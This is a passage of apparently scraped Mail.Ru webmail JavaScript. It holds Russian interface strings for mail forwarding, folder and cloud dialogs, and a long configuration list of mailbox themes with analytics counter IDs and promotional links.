						reg_token_required:  'Введите код, отправленный в SMS'
					}
				}
			},

			edit : {
				confirm: {
					title: 'Введите текущий пароль',
					desc: 'Для подтверждения настройки пересылки введите пароль от текущего ящика<span class=popup__desc_phone> и код, отправленный в SMS на номер</span>',
					controls: {
						reset: 'Отменить',
						add: 'Принять',
						code: 'Код из SMS',
						password: 'Пароль',
						resend: 'Не пришло SMS-сообщение?'
					},
					errors: {
						password_required:  'Введите пароль',
						password_invalid:  'Введен неверный пароль',
						reg_token_invalid:  'Введен неверный код',
						reg_token_required:  'Введите код, отправленный в SMS'
					}
				}
			},

			unapply: {
				title: 'Вы действительно хотите отменить фильтрацию рассылок?',
				desc: 'Папки %s будут удалены, но&nbsp;все письма из&nbsp;них сохранятся и вернутся в&nbsp;папку «Входящие».',
				folder_tpl: '«%s»',
				controls: {
					accept: 'Отменить фильтрацию',
					deny:  'Закрыть'
				}
			},

			unapply: {
				title: 'Вы действительно хотите отменить фильтрацию рассылок?',
				desc: 'Папки %s будут удалены, но&nbsp;все письма из&nbsp;них сохранятся и вернутся в&nbsp;папку «Входящие».',
				folder_tpl: '«%s»',
				controls: {
					accept: 'Отменить фильтрацию',
					deny:  'Закрыть'
				}
			}
		},

		folder: {
			remove: {
				title: 'Вы действительно хотите удалить папку?',
				desc: 'Папка «%FOLDER_NAME%» будет удалена.',
				labels: {
					custom_folder: 'Переместить письма из папки в',
					default_folder: 'Переместить письма из папки в Корзину'
				},
				controls: {
					accept: 'Удалить',
					deny:  'Отмена'
				}
			}
		},

		apicloud: {
			folder: {
				add: {
					title: 'Создать папку в облаке',
					'title-alt': 'Создать папку в «%s»',
					controls: {
						accept: 'Создать',
						deny:  'Отмена'
					},
					errors: {
						name_required: 'У папки должно быть имя.',
						home_exists: 'Папка «%s» уже существует.',
						home_invalid: 'Некорректное имя папки.',
						home_name_length_exceeded: 'Слишком длинное имя папки.'
					}
				}
			}
		}
	}});

	Lang.add({'RU': {
		'ios8-fileapi-bug-message': 'К сожалению, сейчас прикрепить фото и видео в браузере Safari для iOS8 невозможно.{n}Компания Apple уже уведомлена об этом, и мы работаем над решением данной проблемы.{n}Приносим свои извинения за временные неудобства.'
	}});

	Lang.add({'RU': {
		'editors': {
			'mailpad': {
				title: 'Редактор Mail.Ru',
				titleGenitive: 'Редактора Mail.Ru',
				description: 'Новое приложение Mail.Ru для редактирования документов Word. Доступна альфа-версия с базовым функционалом'
			},
			'owa': {
				title: 'Microsoft Office Web App',
				description: 'Онлайн-версия Microsoft Office, позволяющая редактировать презентации PowerPoint и таблицы Excel'
			},
			'libre': {
				title: 'Libre Office',
				description: 'Онлайн-версия популярного офисного пакета, аналогичного Microsoft Office. Версия предоставлена сервисом rollApp.com'
			},
			'aviary': {
				title: 'Adobe Creative SDK',
				description: 'Многофункциональный редактор изображений'
			},
			'office': {
				title: 'Microsoft Office Online',
				description: 'Онлайн-версия Microsoft Office, позволяющая редактировать документы Word, таблицы Excel и презентации PowerPoint'
			}
		}
	}});

	Lang.add({'RU': {
		'viewer': {
			'toolbar': {
				'showContents': 'Показать файлы',
				'read': 'Прочитать',
				'editSimple': 'Редактировать',
				'editMultiple': 'Редактировать',
				'download': 'Скачать',
				'saveToCloud': 'Сохранить в Облако',
				'forward': 'Переслать'
			}
		}
	}});

	Lang.add({'RU': {
		'fast-reply': {
			'toolbar': {
				'send': 'Отправить',
				'reply': 'Ответить',
				'replyAll': 'Ответить всем',
				'forward': 'Переслать',
				'fullCompose': 'Полная форма'
			}
		}
	}});
});
__log.lang_js = 1;
</script>

<script type="text/javascript">
patron['themes'] = (function() {
    var themes = {
		
		  'default': {
			  title: 'Классическая'
			, counters: {
				  show: 518501
				, load: 585249
			}
		}
		

		, t1000: {
			  title: 'Божья коровка'
			, counters: {
				  show: 518503
				, load: 585250
			}
		}

		, t1001: {
			  title: 'Медитация'
			, counters: {
				  show: 518504
				, load: 585251
			}
		}

		, t1002: {
			  title: 'Город'
			, counters: {
				  show: 518505
				, load: 585645
			}
		}

		, t1003: {
			  title: 'Крокусы'
			, counters: {
				  show: 529521
				, load: 585646
			}
		}

		, t1004: {
			  title: 'Клубника'
			, counters: {
				  show: 529522
				, load: 585651
			}
		}

		, t1005: {
			  title: 'Огни мегаполиса'
			, counters: {
				  show: 529523
				, load: 585644
			}
		}

		, t1006: {
			  title: 'Фиолетовый холст'
			, counters: {
				  show: 529524
				, load: 585650
			}
		}

		, t1007: {
			  title: 'Земляника'
			, counters: {
				  show: 529525
				, load: 585647
			}
		}

		, t1008: {
			  title: 'Зомби'
			, counters: {
				  show: 542191
				, load: 585656
			}
		}

		, t1009: {
			  title: 'Яркие письма'
			, counters: {
				  show: 529526
				, load: 585648
			}
		}

		, t1010: {
			  title: 'Полосатая'
			, counters: {
				  show: 529527
				, load: 585664
			}
		}

		, t1011: {
			  title: 'Кляксы'
			, counters: {
				  show: 529528
				, load: 585659
			}
		}

		, t1012: {
			  title: 'Лайт'
			, counters: {
				  show: 529529
				, load: 585667
			}
		}

		, t1013: {
			  title: 'Кошки'
			, counters: {
				  show: 542192
				, load: 585658
			}
		}

		, t1014: {
			  title: 'Крыши'
			, counters: {
				  show: 542193
				, load: 585662
			}
		}

		, t1015: {
			  title: 'Трава'
			, adaptive_background: true
			, counters: {
				  show: 542195
				, load: 585652
			}
		}

		, t1016: {
			  title: 'Сказочный город'
			, counters: {
				  show: 542196
				, load: 585655
			}
		}

		, t1017: {
			  title: 'Казино'
			, counters: {
				  show: 545468
				, load: 585657
			}
		}

		, t1018: {
			  title: 'Волк и овцы'
			, counters: {
				  show: 545464
				, load: 585663
			}
		}

		, t1019: {
			  title: 'Простоквашино'
			, counters: {
				  show: 545471
				, load: 585673
			}
		}

		, t1020: {
			  title: 'Simon’s Cat'
			, counters: {
				  show: 545465
				, load: ''
			}
		}

		, t1021: {
			  title: 'Simon’s Cat'
			, counters: {
				  show: 545466
				, load: 585670
			}
		}

		, t1022: {
			  title: 'Пирс'
			, counters: {
				  show: 545462
				, load: 585654
			}
		}

		, t1023: {
			  title: 'Изумрудный город'
			, counters: {
				  show: 545469
				, load: 585665
			}
		}

		, t1024: {
			  title: 'Крыши'
			, counters: {
				  show: 558990
				, load: 585662
			}
		}

		, t1025: {
			  title: 'Хэллоуин'
			, counters: {
				  show: 570162
				, load: 585649
			}
		}

		, t1026: {
			  title: 'Роботы'
			, text: 'Поздравляем! Сейчас будет включена скрытая тема оформления \"Роботы\"'
			, counters: {
				  show: 570164
				, load: 585666
			}
		}

		, t1027: {
			  title: 'Монстры'
			, counters: {
				  show: 570163
				, load: 585661
			}
		}

		, t1028: {
			  title: 'Игра в снежки'
			, counters: {
				  show: 599645
				, load: 599644
			}
		}

		, t1029: {
			  title: 'Секретная служба'
			, counters: {
				  show: 603227
				, load: 603236
			}
		}

		, t1030: {
			  title: 'СССК'
			, counters: {
				  show: 603228
				, load: 603237
			}
		}

		, t1031: {
			  title: 'Аниме'
			, counters: {
				  show: 603229
				, load: 603239
			}
		}

		, t1032: {
			  title: 'Новогодняя'
			, counters: {
				  show: 603230
				, load: ''
			}
		}

		, t1033: {
			  title: 'Осенний Кот'
			, counters: {
				  show: ''
				, load: 585671
			}
		}

		, t1034: {
			  title: 'Рождественская'
			, counters: {
				  show: ''
				, load: 625677
			}
		}

		, t1036: {
			  title: 'Легенда'
			, link: {
				  href: 'http://1link.mail.ru/c.php?site_id=65818&p=704&sub_id=0'
				, title: 'Играть!'
				, target: '_blank'
			}
			, counters: {
				  show: 658521
				, load: 656830
			}
		}

		, t1037: {
			  title: 'Котики'
			, counters: {
				  show: 658513
				, load: 658523
			}
		}

		, t1038: {
			  title: '14 февраля'
			, counters: {
				  show: 658518
				, load: 658529
			}
		}

		, t1040: {
			  title: 'Простоквашино'
			, counters: {
				  show: 658516
				, load: 658527
			}
		}

		, t1041: {
			  title: 'Весенняя'
			//, preview: 't1041/may/preview.jpg?v=1'
			, counters: {
				  show: 660449
				, load: 660487
			}
		}

		, t1042: {
			  title: 'Вышивка'
			, counters: {
				  show: 720575
				, load: 720576
			}
		}

		, t1043: {
			  title: 'Сласти'
			, counters: {
				  show: 660446
				, load: 660483
			}
		}

		, t1044: {
			  title: 'Половодье'
			, counters: {
				  show: 545471
				, load: 585673
			}
		}

		, t1045: {
			title: 'Гонки'
			, counters: {
				  show: 818213
				, load: 818202
			}
		}

		, t1046: {
			title: 'Перья'
			, counters: {
				  show: 868710
				, load: 868711
			}
		}

		, t1047: {
			title: 'Ромбики'
			, counters: {
				  show: 868709
				, load: 868708
			}
		}

		, t1048: {
			title: 'Футбол'
			, counters: {
				  show: 866077
				, load: 866080
			}
		}

		, t1049: {
			  title: 'Длиннокот'
			, link: {
				  href: 'http://www.kyiv2025.kiev.ua/'
				, title: 'Кошка — Сороконожка'
				, target: '_blank'
			}
			, counters: {
				  show: 972824
				, load: 972825
			}
		}

		, t1050: {
			title: 'Эскимосы'
			, counters: {
				  show: 1020302
				, load: 1020300
			}
		}

		, t1051: {
			  title: 'Cut the Rope'
			, link: {
				  href: 'http://cuttherope.net/'
				, title: 'Играть в Cut the rope бесплатно!'
				, target: '_blank'
			}
			, counters: {
				  show: 1031938
				, load: 1031939
			}
		}

		, t1052: {
			title: 'Граффити'
			, counters: {
				  show: 1031708
				, load: 1031709
			}
		}

		, t1053: {
			title: 'Цирк'
			, counters: {
				  show: 603231
				, load: 603243
			}
		}

		, t1054: {
			title: 'Восточная'
			, counters: {
				  show: 1106787
				, load: 1106788
			}
		}

		, t1055: {
			title: 'Киев'
			, counters: {
				  show: 1119205
				, load: 1119206
			}
		}

		, t1056: {
			title: 'Маленькое королевство'
			, variants: ['all', 'v2', 'v3']
			, link: {
				  href: 'http://gapart.com/'
				, title: 'gapart.com'
				, target: '_blank'
			}
			, counters: {
				  show: 1150108
				, load: 1150111
			}
		}

		, t1057: {
			title: 'Домовята'
			, link: {
				  href: 'http://my.mail.ru/apps/559506?ref=mailbox'
				, title: 'Играть!'
				, target: '_blank'
			}
			, counters: {
				  show: 1138594
				, load: 1138595
			}
		}

		, t1058: {
			  title: 'Правила войны'
			, link: {
				  href: 'http://my.mail.ru/apps/608884?ref=mailbox'
				, title: 'Играть!'
				, target: '_blank'
			}
			, counters: {
				  show: 1152229
				, load: 1152230
			}
		}

		, t1059: {
			title: 'Монстры на каникулах'
			, counters: {
				  show: 1168842
				, load: 1168846
			}
		}

		, t1060: {
			title: 'Сумерки'
			, counters: {
				  show: 1049171
				, load: 1049160
			}
		}

		, t1061: {
			title: 'Монстры на каникулах'
			, counters: {
				  show: 1180031
				, load: 1180032
			}
		}
		, t1062: {
			title: 'Пинап'
			, counters: {
				  show: 1196375
				, load: 1196376
			}
		}

		, t1063: {
			title: 'Дима Логинoff'
			, counters: {
				  show: 1220788
				, load: 1220792
			}
		}

		, t1064: {
			title: 'Пираты'
			, link: {
				  href: 'http://my.mail.ru/apps/655199?ref=mailbox'
				, title: 'Играть!'
				, target: '_blank'
			}
			, counters: {
				  show: 1152231
				, load: 1152234
			}
		}

		, t1065: {
			title: 'Троецарствие'
			, link: {
				  href: 'http://1link.mail.ru/c.php?site_id=75696&p=109&sub_id=0'
				, title: 'Играть!'
				, target: '_blank'
			}
			, counters: {
				  show: 1220790
				, load: 1220793
			}
		}

		, t1066: {
			title: 'Новый год 50-х'
			, counters: {
				  show: 1271947
				, load: '1271948	'
			}

		}

		, t1067: {
			title: 'Дикий Запад'
			, link: {
				  href: 'http://my.mail.ru/apps/559650?ref=mailbox'
				, title: 'Играть!'
				, target: '_blank'
			}
			, counters: {
				  show: 1296950
				, load: 1296952
			}
		}

		, t1068: {
			title: 'Мегаполис'
			, link: {
				  href: 'http://my.mail.ru/apps/494497?ref=mailbox'
				, title: 'Играть!'
				, target: '_blank'
			}
			, counters: {
				  show: 1315466
				, load: 1315467
			}
		}

		, t1069: {
			title: 'Камни'
			, counters: {
				  show: 1296227
				, load: 1296228
			}
		}

		, t1070: {
			title: 'Легенда. Зима'
			, link: {
				  href: 'http://1link.mail.ru/c.php?site_id=65818&p=704&sub_id=0'
				, title: 'Играть!'
				, target: '_blank'
			}
			, counters: {
				  show: 1220787
				, load: 1220791
			}
		}

		, t1071: {
			title: 'Деревяшечка'
			, counters: {
				  show: 1325858
				, load: 1325872
			}
		}

		, t1072: {
			title: 'Плохой Санта'
			, counters: {
				  show: 1325869
				, load: 1325879
			}
		}

		, t1073: {
			title: 'Новогодняя Ёлка'
			, counters: {
				  show: 1325861
				, load: 1325875
			}
		}

		, t1074: {
			title: 'Ангелы'
			, counters: {
				  show: 1325863
				, load: 1325877
			}
		}

		, t1075: {
			title: 'Кирпичи'
			, counters: {
				  show: 1348691
				, load: 1348693
			}
		}

		, t1076: {
			title: 'Снежинки'
			, counters: {
				  show: 1347100
				, load: 1347101
			}
		}

		, t1077: {
			title: 'Аниме'
			, counters: {
				  show: 1348692
				, load: 1348694
			}
		}

		, t1078: {
			title: 'Зёрна'
			, counters: {
				  show: 1392414
				, load: 1392428
			}
		}

		, t1079: {
			title: 'Сердца'
			, counters: {
				  show: 1392418
				, load: 1392433
			}
		}

		, t1080: {
			title: 'Кабаре'
			, counters: {
				  show: 1409909
				, load: 1409910
			}
		}

		, t1081: {
			title: 'Соты'
			, counters: {
				  show: 1392416
				, load: 1392430
			}
		}

		, t1082: {
			title: 'Perfect World'
			, link: {
				  href: 'http://r.mail.ru/clb1526970/pw.mail.ru'
				, title: 'Играть!'
				, target: '_blank'
			}
			, counters: {
				  show: 1461732
				, load: 1461734
			}
		}

		, t1083: {
			title: 'Беларусь'
			, counters: {
				  show: 1430420
				, load: 1430421
			}
		}

		, t1084: {
			title: 'Angry Birds'
			, counters: {
				  show: 1489721
				, load: 1489723
			}
		}

		, t1085: {
			title: 'Angry Birds Space'
			, counters: {
				  show: 1489722
				, load: 1489724
			}
		}

		, t1086: {
			title: 'Цветы'
			, variants: ['all', 'v2', 'v3', 'v4', 'v5']
			, adaptive_background: true
			, counters: {
				  show: 1541523
				, load: 1541524
			}
		}

		, t1087: {
			title: 'Комиксы'
			, counters: {
				  show: 1541609
				, load: 1541612
			}
		}

		, t1088: {
			title: 'Заячья любовь'
			, adaptive_background: true
			, counters: {
				  show: 1628557
				, load: 1628545
			}
		}

		, t1089: {
			title: 'Смурфики 2'
			, counters: {
				  show: 1807124
				, load: 1807125
			}
		}

		, t1090: {
			title: 'Осень'
			, variants: ['all', 'v2', 'v3', 'v4', 'v5']
			, adaptive_background: true
			, counters: {
				  show: 1852220
				, load: 1852222
			}
		}

		, t1101: {
			title: 'Графит'
			, preview: 't1101/flat-.jpg'
			, counters: {
				  show: 5568497
				, load: 5568496
			}
		}

		, t1102: {
			title: 'Зима'
			, adaptive_background: true
			, counters: {
				  show: 3036292
				, load: 3036298
			}
		}

		, t1103: {
			title: 'Хэлоуин'
			, counters: {
				  show: 3493005
				, load: 3493011
			}
		}

		, t1104: {
			title: 'Коровы на льду'
			, counters: {
				  show: 3990266
				, load: 3990267
			}
		}

		, t1105: {
			title: 'Я тебя люблю'
			, counters: {
				  show: 3672508
				, load: 3672518
			}
		}

		, t1106: {
			title: 'Тату'
			, counters: {
				  show: 3672510
				, load: 3672522
			}
		}

		, t1107: {
			title: 'Свитер с оленями'
			, counters: {
				  show: 3672511
				, load: 3672524
			}
		}

		, t1108: {
			title: 'Сакура'
			, counters: {
				  show: 3672512
				, load: 3672526
			}
		}

		, t1109: {
			title: 'Наурыз'
			, counters: {
				  show: 3672514
				, load: 3672528
			}
		}

		, t1110: {
			title: '14 февраля'
			, counters: {
				  show: 4236569
				, load: 4236578
			}
		}

		, t1111: {
			title: 'Новый год'
			, counters: {
				  show: 4706580
				, load: 4706585
			}
		}

		, t1112: {
			  title: 'Ноготки'
			, adaptive_background: true
			, counters: {
				  show: 5433519
				, load: 5433525
			}
		}

		, t1113: {
			title: 'Спортивные панды'
			, variants: ['all', 'v2', 'v3']
			, counters: {
				  show: 5598407
				, load: 5598416
			}
		}

		, t1114: {
			title: 'Красные розы'
			, adaptive_background: true
			, counters: {
				  show: 13727917
				, load: 13727918
			}
		}

		, t1115: {
			title: 'Прованс'
			, variants: ['all', 'v2', 'v3', 'v4', 'v5', 'v6']
			, adaptive_background: true
			, counters: {
				  show: 5598412
				, load: 5598418
			}
		}

		, t1116: {
			title: 'Пушистик'
			, adaptive_background: true
			, counters: {
				  show: 5758907
				, load: 5758910
			}
		}

		, t1117: {
			title: 'Котята'
			, adaptive_background: true
			, variants: ['all', 'v2', 'v3', 'v4']
			, counters: {
				  show: 5753261
				, load: 5753264
			}
		}

		, t1118: {
			title: 'Спящая кошка'
			, adaptive_background: true
			, counters: {
				  show: 5756779
				, load: 5756769
			}
		}

		, t1119: {
			  title: 'Розы'
			, adaptive_background: true
			, counters: {
				  show: 5756681
				, load: 5756688
			}
		}

		, t1120: {
			  title: 'Ретро-такси'
			, adaptive_background: true
			, counters: {
				  show: 5756678
				, load: 5756666
			}
		}

		, t1121: {
			  title: 'Ромашки'
			, adaptive_background: true
			, counters: {
				  show: 5756543
				, load: 5756615
			}
		}

		, t1122: {
			  title: 'Розовые холмы'
			, adaptive_background: true
			, counters: {
				  show: 5756468
				, load: 5756578
			}
		}

		, t1123: {
			  title: 'Холмы'
			, adaptive_background: true
			, counters: {
				  show: 5756449
				, load: 5756553
			}
		}

		, t1124: {
			title: 'Стражи галактики'
			, adaptive_background: true
			, variants: ['all', 'v2', 'v3', 'v4', 'v5']
			, link: {
				  href: 'http://gotg.marvel.com.ru/'
				, title: 'Стражи галактики'
				, target: '_blank'
			}
			, counters: {
				  show: 7589355
				, load: 7589374
			}
		}

		, t1125: {
			title: 'Самолеты'
			, adaptive_background: true
			, link: {
				  href: 'http://planes2.disney.ru'
				, title: 'Самолёты'
				, target: '_blank'
			}
			, counters: {
				  show: 8307665
				, load: 8307671
			}
		}

		, t1126: {
			title: 'Феи'
			, adaptive_background: true
			, variants: ['all', 'v2', 'v3']
			, link: {
				  href: 'http://fairies.disney.ru'
				, title: 'Феи'
				, target: '_blank'
			}
			, counters: {
				  show: 9339147
				, load: 9339180
			}
		}

		, t1127: {
			title: 'Микки Маус'
			, adaptive_background: true
			, variants: ['v4']
			, link: {
				  href: 'http://mickey.disney.ru'
				, title: 'Микки Маус'
				, target: '_blank'
			}
			, counters: {
				  show: 9336401
				, load: 9336505
			}
		}

		, t1128: {
			title: 'Бемби'
			, adaptive_background: true
			, link: {
				  href: 'http://disney.ru'
				, title: 'Бемби'
				, target: '_blank'
			}
			, counters: {
				  show: 9005906
				, load: 9005935
			}
		}

		, t1129: {
			title: 'Холодное сердце'
			, adaptive_background: true
			, variants: ['all', 'v2', 'v3']
			, link: {
				  href: 'http://frozen.disney.ru'
				, title: 'Холодное сердце'
				, target: '_blank'
			}
			, counters: {
				  show: 11121702
				, load: 11122009
			}
		}

		, t1130: {
			title: 'В поисках Немо'
			, adaptive_background: true
			, variants: ['all', 'v2', 'v3', 'v4']
			, link: {
				  href: 'http://disney.ru'
				, title: 'В поисках Немо'
				, target: '_blank'
			}
			, counters: {
				  show: 11121703
				, load: 11122015
			}
		}

		, t1131: {
			title: 'Король Лев'
			, adaptive_background: true
			, counters: {
				  show: 11121705
				, load: 11122158
			}
		}

		, t1132: {
			title: 'Современный хаки'
			, adaptive_background: true
			, counters: {
				  show: 13727966
				, load: 13727967
			}
		}

		, t1133: {
			title: 'Микки Маус'
			, link: {
				  href: 'http://mickey.disney.ru'
				, title: 'Микки Маус'
				, target: '_blank'
			}
			, counters: {
				  show: 11121684
				, load: 11122007
			}
		}

		, t1134: {
			title: 'Минни Маус'
			, variants: ['all', 'v2']
			, link: {
				  href: 'http://mickey.disney.ru'
				, title: 'Микки Маус'
				, target: '_blank'
			}
			, counters: {
				  show: 11121673
				, load: 11122005
			}
		}

		, t1135 : {
			title : 'Клуб пингвинов'
			, adaptive_background: true
			, link : {
				  href: 'http://play.clubpenguin.com/ru?oast=DOS_CP_CPVW_WEB_THEMES_2015RUMAILTHEME_NA_RU_RU_NA'
				, title: 'Клуб пингвинов'
	  			, target: '_blank'
	  		}
			, counters: {
				  show: 11121710
				, load: 11122159
			}
	  	}

		, t1136: {
			title: 'Мстители'
			, variants: ['all', 'v2', 'v3']
			, adaptive_background: true
			, link: {
				  href: 'http://marvel.com.ru/'
				, title: 'Мстители'
				, target: '_blank'
			}
			, counters: {
				  show: 15402003
				, load: 15402007
			}
		}

		, t1137: {
			title: 'Тачки'
			, adaptive_background: true
			, variants: ['all', 'v2', 'v3']
			, link: {
				  href: 'http://cars.disney.ru/'
				, title: 'Тачки'
				, target: '_blank'
			}
			, counters: {
				  show: 11121751
				, load: 11122161
			}
		}

		, t1138: {
			title: 'Винни Пух'
			, adaptive_background: true
			, link: {
				  href: 'http://winnie.disney.ru'
				, title: 'Медвежонок Винни и его друзья'
				, target: '_blank'
			}
			, counters: {
				  show: 11121763
				, load: 11122200
			}
		}

		, t1139: {
			title: 'Валли'
			, adaptive_background: true
			, variants: ['all', 'v2', 'v3']
			, link: {
				  href: 'http://disney.ru'
				, title: 'Валли'
				, target: '_blank'
			}
			, counters: {
				  show: 11121774
				, load: 11122202
			}
		}

		, t1140: {
			title: 'Город героев'
			, adaptive_background: true
			, variants: ['all', 'v2', 'v3']
			, link: {
				  href: 'http://bighero.disney.ru'
				, title: 'Город героев'
				, target: '_blank'
			}
			, counters: {
				  show: 11121782
				, load: 11122203
			}
		}

		, t1141: {
			title: 'Ральф'
			, adaptive_background: true
			, variants: ['all', 'v2', 'v3']
			, link: {
				  href: 'http://disney.ru'
				, title: 'Ральф'
				, target: '_blank'
			}
			, counters: {
				  show: 12193487
				, load: 12193490
			}
		}

		, t1142: {
			title: 'Феи'
			, adaptive_background: true
			, link: {
				  href: 'http://fairies.disney.ru'
				, title: 'Феи'
				, target: '_blank'
			}
			, counters: {
				  show: 12193650
				, load: 12193654
			}
		}

		, t1143: {
			title: 'Новый год'
			, variants: ['all', 'v2', 'v3']
			, counters: {
				  show: 12860795
				, load: 12860800
			}
		}

		, t1144: {
			title: 'Чип и Дейл'
			, adaptive_background: true
			, link: {
				  href: 'http://disney.ru'
				, title: 'Чип и Дейл'
				, target: '_blank'
			}
			, counters: {
				  show: 12193547
				, load: 12193548
			}
		}

		, t1145: {
			title: 'Русалочка'
			, adaptive_background: true
			, link: {
				  href: 'http://princess.disney.ru/'
				, title: 'Принцессы Disney'
				, target: '_blank'
			}
			, counters: {
				  show: 13059123
				, load: 13059128
			}
		}

		, t1146: {
			title: 'История игрушек'
			, adaptive_background: true
			, variants: ['all', 'v2', 'v3']
			, link: {
				  href: 'http://disney.ru'
				, title: 'История игрушек'
				, target: '_blank'
			}
			, counters: {
				  show: 14201232
				, load: 14201246
			}
		}

		, t1147: {
			title: 'Микки Маус'
			, adaptive_background: true
			, variants: ['all', 'v2', 'v3','v4', 'v5']
			, link: {
				  href: 'http://mickey.disney.ru'
				, title: 'Микки Маус'
				, target: '_blank'
			}
			, counters: {
				  show: 13204497
				, load: 13204521
			}
		}

		, t1148: {
			title: 'Храбрая сердцем'
			, adaptive_background: true
			, variants: ['all', 'v2', 'v3']
			, link: {
				  href: 'http://princess.disney.ru/'
				, title: 'Храбрая сердцем'
				, target: '_blank'
			}
			, counters: {
				  show: 13059216
				, load: 13059226
			}
		}

		, t1149: {
			title: 'Запорожье'
			, link: {
				  href: 'http://games.mail.ru/pc/games/zaporozhe/'
				, title: 'Играть'
			}
			, counters: {
				  show: 13785078
				, load: 13785120
			}
		}

		, t1150: {
			title: 'World Poker Club'
			, link: {
				  href: 'http://games.mail.ru/pc/games/world_poker_club/'
				, title: 'World Poker Club'
				, target: '_blank'
			}
			, counters: {
				  show: 13785084
				, load: 13785131
			}
		}

		, t1151: {
			title: 'Космос'
			, adaptive_background: true
			, variants: ['all', 'v2']
			, counters: {
				  show: 15113835
				, load: 15113840
			}
		}

		, t1189: {
			title: 'Погода'
			, adaptive_background: true
			, widget: {
				js: 'patron.ui/widgets/patron.ui.widgets.Weather'
				, slot: 2928
				
				, disabled: true
				, needLoad: true
			}
			, counters: {
				  show: 14298218
				, load: 14298221
			}
		}

		, t1190: {
			title: 'Чемпионат России по футболу'
			
			, widget: {
				js: 'patron.ui/widgets/patron.ui.widgets.FIFA2014'
				, slot: 3914
			}
			
			, adaptive_background: true
			, counters: {
				  show: 6587117
				, load: 6587123
			}
		}

		, t1191: {
			title: 'Кира Пластинина'
			, counters: {
				  show: 1628549
				, load: 1628537
			}
		}

		, t1192: {
			title: 'Задорина'
			, counters: {
				  show: 1628555
				, load: 1628540
			}
		}

		, t1193: {
			title: 'Логинов'
			, counters: {
				  show: 1628550
				, load: 1628539
			}
		}

		, t1194: {
			title: 'Андрей Бартенев'
			, counters: {
				  show: 2062651
				, load: 2062668
			}
		}

		, t1195: {
			title: 'Сергей Бондарев'
			, counters: {
				  show: 2062652
				, load: 2062671
			}
		}

		, t1196: {
			title: 'Виктория Андреянова'
			, counters: {
				  show: 2062648
				, load: 2062664
			}
		}

		, t1197: {
			title: 'Султана Французова'
			, counters: {
				  show: 1628548
				, load: 1628536
			}
		}

		, t1198: {
			title: 'Олег Овсиев'
			, counters: {
				  show: 2062654
				, load: 2062674
			}
		}

		, t1199: {
			title: 'Влад Лисовец'
			, counters: {
				  show: 2062647
				, load: 2062660
			}
		}

		/* my.com themes */
		, t2000: {
			title: 'Спокойствие'
			, adaptive_background: true
			, counters: {
				  show: ''
				, load: ''
			}
		}

		, t2011: {
			title: 'Скорость'
			, adaptive_background: true
			, counters: {
				  show: 5719916
				, load: 5720185
			}
		}

		, t2012: {
			title: 'Холст'
			, adaptive_background: true
			, counters: {
				  show: 5719917
				, load: 5720187
			}
		}

		, t2013: {
			title: 'Волна'
			, adaptive_background: true
			, counters: {
				  show: 5719923
				, load: 5720189
			}
		}

		, t2014: {
			title: 'Геометрия'
			, adaptive_background: true
			, counters: {
				  show: 5719932
				, load: 5720192
			}
		}

		, t2015: {
			title: 'Каньон Антилопы'
			, adaptive_background: true
			, counters: {
				  show: 5719945
				, load: 5720193
			}
		}

		, t2016: {
			title: 'Лед'
			, adaptive_background: true
			, counters: {
				  show: 5719953
				, load: 5720197
			}
		}

		, t2017: {
			title: 'Променад'
			, adaptive_background: true
			, counters: {
				  show: 5719967
				, load: 5720198
			}
		}

		, t2018: {
			title: 'Спокойствие'
			, adaptive_background: true
			, counters: {
				  show: 5719915
				, load: 5720183
			}
		}

		, t2019: {
			title: 'Перспектива'
			, adaptive_background: true
			, counters: {
				  show: 5719971
				, load: 5720204
			}
		}

		, t2020: {
			title: 'Воздушные шары'
			, adaptive_background: true
			, counters: {
				  show: 5719973
				, load: 5720205
			}
		}

		, t2021: {
			title: 'Пляж'
			, adaptive_background: true
			, counters: {
				  show: ''
				, load: ''
			}
		}

		, t2022: {
			title: 'Цветение'
			, adaptive_background: true
			, counters: {
				  show: 5719975
				, load: 5720206
			}
		}

		, t2023: {
			title: 'На глубине'
			, adaptive_background: true
			, counters: {
				  show: 5719977
				, load: 5720207
			}
		}

		, t2024: {
			title: 'Елочные игрушки'
			, adaptive_background: true
			, counters: {
				  show: 5719980
				, load: 5720208
			}
		}

		, t2025: {
			title: 'Ромашки'
			, adaptive_background: true
			, counters: {
				  show: 5719982
				, load: 5720209
			}
		}

		, t2026: {
			title: 'Дымка'
			, adaptive_background: true
			, counters: {
				  show: 5719997
				, load: 5720212
			}
		}

		, t2027: {
			title: 'Трава'
			, adaptive_background: true
			, counters: {
				  show: 5720005
				, load: 5720213
			}
		}

		, t2028: {
			title: 'Зеленый холст'
			, adaptive_background: true
			, counters: {
				  show: 5720024
				, load: 5720214
			}
		}

		, t2030: {
			title: 'Мегаполис'
			, adaptive_background: true
			, counters: {
				  show: ''
				, load: ''
			}
		}

		, t2031: {
			title: 'Море'
			, adaptive_background: true
			, counters: {
				  show: 5720045
				, load: 5720215
			}
		}

		, t2032: {
			title: 'Серфинг'
			, adaptive_background: true
			, counters: {
				  show: 5720083
				, load: 5720217
			}
		}

		, t2033: {
			title: 'Треугольники'
			, adaptive_background: true
			, counters: {
				  show: 5720125
				, load: 5720218
			}
		}

		, t2034: {
			title: 'Ночной город'
			, adaptive_background: true
			, counters: {
				  show: 5720151
				, load: 5720219
			}
		}

		, t3000: {
			title: 'Погода'
			, adaptive_background: true
			, widget: {
				js: 'patron.ui/widgets/patron.ui.widgets.Weather'
				, slot: 7164
				
				, disabled: true
				, needLoad: true
			}
			, counters: {
				  show: 15402004
				, load: 15402008
			}
		}

		, t3001: {
			title: 'Хоккей'
			, adaptive_background: true
			, variants: ['v2']
			, counters: {
				  show: 15758197
				, load: 15758278
			}
		}
	};

	function _strToList(str) {
		return str
				.replace(/(^\s+|\s+$)/g, '')
				.split(/\s+/)
				.map(function(item) {
					var split = item.split(':'),
						id = split[0];

					if (split.length > 1) {
						var theme = themes[id];

						if(theme) {
							theme.types = split[1].split(',')
						}
					}

					return id
				});
	}

